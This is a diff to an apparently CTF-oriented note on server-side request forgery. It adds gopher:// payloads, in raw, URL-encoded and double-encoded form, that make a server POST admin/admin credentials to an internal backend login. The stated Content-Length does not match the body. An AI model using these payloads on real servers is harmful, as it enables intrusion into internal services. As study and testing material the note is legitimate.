@@ -74,8 +74,6 @@ Server Makes Internal Request:
 
     - Monitor server traffic for unusual outbound HTTP requests
 
-
-
 ---
 
 ```shell
@@ -179,6 +177,24 @@ gopher://127.0.0.1:80/_GET%20/target%20HTTP/1.1%0a
 
 ```url
 http://target/flag?password=admin&apiKey=key
+```
+
+```url
+gopher://backend:80/_POST /login HTTP/1.1
+Host: backend
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 41
+
+username=admin&password=admin
+```
+
+```shell
+gopher://backend:80/_POST%20/login%20HTTP/1.1%0AHost:%20backend%0AContent-Type:%20application/x-www-form-urlencoded%0AContent-Length:%2041%0A%0Ausername=admin&password=admin
+```
+
+
+```shell
+gopher%3A%2F%2Fbackend%3A80%2F_POST%2520%2Flogin%2520HTTP%2F1.1%250AHost%3A%2520backend%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250AContent-Length%3A%252041%250A%250Ausername%3Dadmin%26password%3Dadmin
 ```
 
 ---
